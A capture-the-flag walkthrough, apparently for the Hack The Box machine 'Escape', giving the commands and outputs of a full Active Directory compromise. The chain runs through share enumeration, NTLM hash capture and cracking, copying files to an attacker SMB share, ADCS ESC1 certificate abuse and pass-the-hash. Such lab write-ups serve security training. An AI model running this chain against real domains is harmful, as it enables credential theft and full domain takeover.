### Guided Mode
__What is the domain name for Escape as enumerated from the LDAP service?__
```zsh
rustscan -a 10.129.228.253 --ulimit 5000 -- -A -T4 -Pn
```
```txt
389/tcp   open  ldap          syn-ack Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2024-02-05T23:20:19+00:00; +8h00m00s from scanner time.
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:dc.sequel.htb, DNS:sequel.htb, DNS:sequel
```

```txt
sequel.htb
```

__What is the name of the non-standard SMB share on Escape?__
```zsh
crackmapexec smb $IP -u 'x' -p '' --shares
```
```txt
SMB         10.129.228.253  445    DC               [*] Windows 10.0 Build 17763 x64 (name:DC) (domain:sequel.htb) (signing:True) (SMBv1:False)
SMB         10.129.228.253  445    DC               [+] sequel.htb\x: 
SMB         10.129.228.253  445    DC               [*] Enumerated shares
SMB         10.129.228.253  445    DC               Share           Permissions     Remark
SMB         10.129.228.253  445    DC               -----           -----------     ------
SMB         10.129.228.253  445    DC               ADMIN$                          Remote Admin
SMB         10.129.228.253  445    DC               C$                              Default share
SMB         10.129.228.253  445    DC               IPC$            READ            Remote IPC
SMB         10.129.228.253  445    DC               NETLOGON                        Logon server share 
SMB         10.129.228.253  445    DC               Public          READ            
SMB         10.129.228.253  445    DC               SYSVOL                          Logon server share 
```

__What is the password for the PublicUser on MSSQL?__
```zsh
smbclient.py $IP
```
```txt
Bonus
For new hired and those that are still waiting their users to be created and perms assigned, can sneak a peek at the Database with
user PublicUser and password GuestUserCantWrite1 .
Refer to the previous guidelines and make sure to switch the "Windows Authentication" to "SQL Server Authentication".
```

```txt
GuestUserCantWrite1
```
__What user is the MSSQL instance running as?__
```zsh
mssqlclient.py sequel.htb\publicuser:GuestUserCantWrite1@$IP
```
- Find service using that port
```zsh
lsof -i TCP:445
```
- Kill that service
```zsh
kill -9 <pid>
```

```zsh
smbserver.py -smb2support share ./
```

```txt
[*] Incoming connection (10.129.228.253,61913)
[*] AUTHENTICATE_MESSAGE (sequel\sql_svc,DC)
[*] User DC\sql_svc authenticated successfully
[*] sql_svc::sequel:aaaaaaaaaaaaaaaa:901469d19a1224588410a468440b21a4:01010000000000000066e26d5158da0193349dcda2f4d8cd000000000100100051004c00640052006a0050006e0061000300100051004c00640052006a0050006e00610002001000730063005500740075006d006100540004001000730063005500740075006d0061005400070008000066e26d5158da010600040002000000080030003000000000000000000000000030000020730b556670d858a133d8a9e87eb86ea969d2c578ee063bf51f87c305a2ca450a0010000000000000000000000000000000000009001e0063006900660073002f00310030002e00310030002e00310034002e0032000000000000000000
[*] Closing down connection (10.129.228.253,61913)
```

```txt
sql_svc
```

__What is the sql_svc user's password?__
- Crack NTLM hash
```zsh
hashcat -m 5600 -a 0 hash.txt git/wordlists/seclists/Passwords/Leaked-Databases/rockyou.txt -O
```
```txt
REGGIE1234ronnie
```
__What is the Ryan.Cooper user's password?__
```zsh
evil-winrm -i $IP -u "sql_svc" -p "REGGIE1234ronnie"
```

- Tansfer Errorlog.bak to attacker machine
```zsh
smbserver.py -smb2support share ./
```
```powershell
cp errorlog.bak //10.10.14.2/share/errorlog.bak
```
```txt
2022-11-18 13:43:07.44 Logon       Error: 18456, Severity: 14, State: 8.
2022-11-18 13:43:07.44 Logon       Logon failed for user 'sequel.htb\Ryan.Cooper'. Reason: Password did not match that for the login provided. [CLIENT: 127.0.0.1]
2022-11-18 13:43:07.48 Logon       Error: 18456, Severity: 14, State: 8.
2022-11-18 13:43:07.48 Logon       Logon failed for user 'NuclearMosquito3'. Reason: Password did not match that for the login provided. [CLIENT: 127.0.0.1]
2022-11-18 13:43:07.72 spid51      Attempting to load library 'xpstar.dll' into memory. This is an informational message only. No user action is required.
```

```txt
NuclearMosquito3
```

__What is the name of the vulnerable ADCS template on Escape?__

```zsh
certipy find -u ryan.cooper -p "NuclearMosquito3" -dc-ip $IP
```

```txt
UserAuthentication
```

__What is the administrator user's NTLM hash?__
>Hint: Exploit the ESC1 vulnerability in the UserAuthentication template to leak this.

```zsh
certipy find -u ryan.cooper -p "NuclearMosquito3" -dc-ip $IP
```

```zsh
certipy req -u ryan.cooper -p "NuclearMosquito3" -ca "sequel-DC-CA" -target "dc.sequel.htb" -template "UserAuthentication" -upn "Administrator@sequel.htb" -dns "dc.sequel.htb" -dc-ip $IP
```

```txt
aad3b435b51404eeaad3b435b51404ee:a52f78e4c751e5f5e17e1e9f3e58f4ee
```

```txt
a52f78e4c751e5f5e17e1e9f3e58f4ee
```

```zsh
psexec.py sequel.htb/Administrator@$IP -hashes aad3b435b51404eeaad3b435b51404ee:a52f78e4c751e5f5e17e1e9f3e58f4ee -dc-ip $IP
```
